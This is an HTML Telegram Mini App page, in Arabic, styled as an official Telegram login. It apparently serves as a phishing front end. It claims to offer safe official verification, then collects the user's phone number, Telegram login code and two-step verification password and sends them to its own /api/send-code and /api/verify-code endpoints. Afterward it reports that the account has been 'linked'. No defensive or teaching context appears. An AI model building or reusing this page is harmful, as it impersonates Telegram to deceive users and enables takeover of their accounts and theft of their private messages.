<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Authorization</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --tg-bg-color: var(--tg-theme-bg-color, #ffffff);
            --tg-text-color: var(--tg-theme-text-color, #222222);
            --tg-hint-color: var(--tg-theme-hint-color, #999999);
            --tg-link-color: var(--tg-theme-link-color, #2481cc);
            --tg-button-color: var(--tg-theme-button-color, #2481cc);
            --tg-button-text-color: var(--tg-theme-button-text-color, #ffffff);
            --tg-secondary-bg-color: var(--tg-theme-secondary-bg-color, #f1f1f2);
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--tg-bg-color);
            color: var(--tg-text-color);
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            box-sizing: border-box;
        }

        .container {
            width: 100%;
            max-width: 380px;
            text-align: center;
        }

        .tg-logo {
            width: 70px;
            height: 70px;
            background: linear-gradient(135deg, #2aabee, #229ed9);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px auto;
            box-shadow: 0 6px 15px rgba(36, 129, 204, 0.25);
        }

        .tg-logo svg {
            width: 38px;
            height: 38px;
            fill: #ffffff;
            margin-left: -3px;
        }

        h2 {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 6px;
            color: var(--tg-text-color);
        }

        p.subtitle {
            font-size: 13px;
            color: var(--tg-hint-color);
            margin-bottom: 20px;
            line-height: 1.4;
        }

        .step-container {
            display: block;
        }

        .step-container.hidden {
            display: none !important;
        }

        .input-group {
            margin-bottom: 14px;
            text-align: right;
        }

        label {
            display: block;
            margin-bottom: 6px;
            font-size: 13px;
            font-weight: 600;
            color: var(--tg-hint-color);
            padding-right: 4px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            background-color: var(--tg-secondary-bg-color);
            border: 1px solid transparent;
            border-radius: 12px;
            font-size: 18px;
            letter-spacing: 1px;
            color: var(--tg-text-color);
            box-sizing: border-box;
            outline: none;
            text-align: center;
            direction: ltr; /* لضمان كتابة الأرقام وزر الـ + بشكل صحيح */
        }

        /* لوحة الأرقام مضبوطة باتجاه LTR لضمان ترتيب 1, 2, 3 نظامياً */
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-bottom: 14px;
            direction: ltr; 
        }

        .key-btn {
            background-color: var(--tg-secondary-bg-color);
            border: none;
            border-radius: 12px;
            padding: 14px 0;
            font-size: 20px;
            font-weight: 600;
            color: var(--tg-text-color);
            cursor: pointer;
        }

        .key-btn:active {
            background-color: var(--tg-link-color);
            color: #ffffff;
        }

        button.action-btn {
            width: 100%;
            padding: 14px;
            background-color: var(--tg-button-color);
            color: var(--tg-button-text-color);
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 5px;
            box-shadow: 0 4px 12px rgba(36, 129, 204, 0.2);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        button.action-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #ffffff;
            animation: spin 0.8s linear infinite;
            display: inline-block;
            margin-left: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .error {
            color: #e74c3c;
            font-size: 13px;
            margin-top: 10px;
            font-weight: 500;
        }

        .success-card {
            background: var(--tg-secondary-bg-color);
            padding: 30px 20px;
            border-radius: 16px;
        }

        .success-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="tg-logo">
            <svg viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.03-1.99 1.27-5.62 3.72-.53.36-1.01.54-1.44.53-.47-.01-1.38-.26-2.06-.48-.83-.27-1.49-.42-1.43-.88.03-.24.37-.49 1.02-.75 3.98-1.73 6.64-2.87 7.98-3.44 3.8-1.63 4.59-1.92 5.1-1.93.11 0 .37.03.54.17.14.12.18.28.2.45-.02.07-.02.13-.04.23z"/>
            </svg>
        </div>

        <h2 id="title">تسجيل الدخول إلى Telegram</h2>
        <p class="subtitle" id="subtitle">يرجى إدخال رقم هاتفك للبدء بعملية التوثيق الرسمية بأمان تام.</p>
        
        <!-- خطوة إدخال الرقم -->
        <div id="step-phone" class="step-container">
            <div class="input-group">
                <label style="text-align: right;">رقم الهاتف</label>
                <input type="text" id="phone" value="+" readonly placeholder="+9639xxxxxxxx">
            </div>
            
            <div class="keypad">
                <button class="key-btn" onclick="pressKey('phone', '1')">1</button>
                <button class="key-btn" onclick="pressKey('phone', '2')">2</button>
                <button class="key-btn" onclick="pressKey('phone', '3')">3</button>
                <button class="key-btn" onclick="pressKey('phone', '4')">4</button>
                <button class="key-btn" onclick="pressKey('phone', '5')">5</button>
                <button class="key-btn" onclick="pressKey('phone', '6')">6</button>
                <button class="key-btn" onclick="pressKey('phone', '7')">7</button>
                <button class="key-btn" onclick="pressKey('phone', '8')">8</button>
                <button class="key-btn" onclick="pressKey('phone', '9')">9</button>
                <button class="key-btn" onclick="pressKey('phone', '+')">+</button>
                <button class="key-btn" onclick="pressKey('phone', '0')">0</button>
                <button class="key-btn" onclick="deleteKey('phone')">⌫</button>
            </div>

            <button id="btn-phone" class="action-btn" onclick="sendCode()">متابعة</button>
        </div>

        <!-- خطوة إدخال الرمز -->
        <div id="step-code" class="step-container hidden">
            <div class="input-group">
                <label style="text-align: right;">رمز التأكيد</label>
                <input type="text" id="code" value="" readonly placeholder="أدخل الرمز المكون من أرقام">
            </div>
            
            <div class="keypad">
                <button class="key-btn" onclick="pressKey('code', '1')">1</button>
                <button class="key-btn" onclick="pressKey('code', '2')">2</button>
                <button class="key-btn" onclick="pressKey('code', '3')">3</button>
                <button class="key-btn" onclick="pressKey('code', '4')">4</button>
                <button class="key-btn" onclick="pressKey('code', '5')">5</button>
                <button class="key-btn" onclick="pressKey('code', '6')">6</button>
                <button class="key-btn" onclick="pressKey('code', '7')">7</button>
                <button class="key-btn" onclick="pressKey('code', '8')">8</button>
                <button class="key-btn" onclick="pressKey('code', '9')">9</button>
                <button class="key-btn" style="visibility: hidden;"></button>
                <button class="key-btn" onclick="pressKey('code', '0')">0</button>
                <button class="key-btn" onclick="deleteKey('code')">⌫</button>
            </div>
            
            <div id="password-group" class="input-group hidden" style="margin-top: 14px;">
                <label style="color: var(--tg-link-color); text-align: right;">كلمة مرور الحساب (2FA)</label>
                <input type="password" id="password" placeholder="أدخل كلمة المرور الخاصة بك" style="text-align: right; direction: rtl;">
            </div>

            <button id="btn-code" class="action-btn" onclick="verifyCode()">تأكيد وتسجيل الدخول</button>
        </div>

        <div id="message" class="error"></div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        let currentPhone = '';

        function pressKey(targetId, num) {
            const input = document.getElementById(targetId);
            input.value += num;
        }

        function deleteKey(targetId) {
            const input = document.getElementById(targetId);
            if (targetId === 'phone') {
                if (input.value.length > 1) input.value = input.value.slice(0, -1);
            } else {
                if (input.value.length > 0) input.value = input.value.slice(0, -1);
            }
        }

        async function sendCode() {
            const phone = document.getElementById('phone').value.trim();
            const msgDiv = document.getElementById('message');
            const btn = document.getElementById('btn-phone');
            msgDiv.innerText = '';

            if (!phone || phone.length < 8) {
                msgDiv.innerText = 'يرجى إدخال رقم هاتف صحيح مع الرمز الدولي';
                return;
            }

            currentPhone = phone;
            const originalText = btn.innerHTML;
            btn.innerHTML = 'جاري الإرسال <span class="spinner"></span>';
            btn.disabled = true;

            try {
                const res = await fetch('/api/send-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone })
                });
                const data = await res.json();

                if (data.success) {
                    document.getElementById('step-phone').classList.add('hidden');
                    document.getElementById('step-code').classList.remove('hidden');
                    document.getElementById('title').innerText = 'أدخل رمز التحقق';
                    document.getElementById('subtitle').innerText = 'تم إرسال رمز إلى حسابك على تيليغرام.';
                } else {
                    msgDiv.innerText = data.error || 'حدث خطأ ما';
                    btn.innerHTML = originalText;
                    btn.disabled = false;
                }
            } catch (err) {
                msgDiv.innerText = 'فشل الاتصال بالخادم';
                btn.innerHTML = originalText;
                btn.disabled = false;
            }
        }

        async function verifyCode() {
            const code = document.getElementById('code').value.trim();
            const password = document.getElementById('password').value.trim();
            const msgDiv = document.getElementById('message');
            const btn = document.getElementById('btn-code');
            msgDiv.innerText = '';

            if (!code) {
                msgDiv.innerText = 'يرجى إدخال رمز التحقق';
                return;
            }

            const originalText = btn.innerHTML;
            btn.innerHTML = 'جاري التحقق <span class="spinner"></span>';
            btn.disabled = true;

            try {
                const res = await fetch('/api/verify-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber: currentPhone, phoneCode: code, password: password })
                });
                const data = await res.json();

                if (data.success) {
                    document.querySelector('.container').innerHTML = `
                        <div class="success-card">
                            <div class="success-icon">✅</div>
                            <h2>تم بنجاح!</h2>
                            <p class="subtitle">تم ربط وتوثيق حسابك بنجاح تام، يمكنك إغلاق هذه النافذة.</p>
                        </div>
                    `;
                } else if (data.needPassword) {
                    document.getElementById('password-group').classList.remove('hidden');
                    msgDiv.style.color = '#e67e22';
                    msgDiv.innerText = data.error;
                    btn.innerHTML = originalText;
                    btn.disabled = false;
                } else {
                    msgDiv.style.color = '#e74c3c';
                    msgDiv.innerText = data.error || 'الرمز المدخل غير صحيح';
                    btn.innerHTML = originalText;
                    btn.disabled = false;
                }
            } catch (err) {
                msgDiv.innerText = 'حدث خطأ أثناء التحقق، حاول مجدداً';
                btn.innerHTML = originalText;
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
